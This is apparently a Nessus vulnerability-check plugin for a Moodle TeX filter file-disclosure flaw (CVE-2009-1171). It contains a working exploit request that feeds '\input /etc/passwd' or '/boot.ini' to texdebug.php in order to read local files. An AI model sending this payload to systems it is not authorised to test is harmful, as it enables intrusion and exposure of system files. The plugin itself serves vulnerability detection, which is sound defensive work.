#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36050);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-1171");
  script_bugtraq_id(34278);
  script_xref(name:"OSVDB", value:"52998");

  script_name(english:"Moodle LaTeX Information Disclosure");
  script_summary(english:"Tries to use texdebug.php to generate a graphic image");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is affected by an\n",
      "information disclosure vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The TeX filter included with the installed version of Moodle can be\n",
      "abused to reveal the contents of files on the remote host, subject to\n",
      "the privileges under which the web server operates."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/502231/30/0/threaded"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Disable the TeX Notation filter, use the included mimetex filter, or\n",
      "configure LaTeX using the more restrictive 'openin_any=p' option."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N"
  );
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');


# Test an install.
install = get_kb_item(string("www/", port, "/moodle"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the texdebug script is accessible.
  url = string(dir, "/filter/tex/texdebug.php");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  if (
    "title>TeX Filter Debugger<" >< res[2] &&
    'value="ShowOutputTex"' >< res[2]
  )
  {
    # Loop through files.
    foreach file (files)
    {
      # Try to generate a GIF image.
      exploit = '\\input ' + file;

      postdata = string(
        "tex=", urlencode(str:exploit), "&",
        "action=ShowImageTex"
      );

      req = http_mk_post_req(
        port        : port,
        item        : url, 
        data        : postdata,
        add_headers : make_array(
          "Content-Type", "application/x-www-form-urlencoded"
        )
      );
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);

      # There's a problem if we see a GIF file.
      if ("image/gif" >< res[1])
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to exploit the issue to reveal the contents of\n",
            "'", file, "' as a graphic image using the following request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
          security_note(port:port, extra:report);
        }
        else security_note(port);

        exit(0);
      }
    }
  }
}
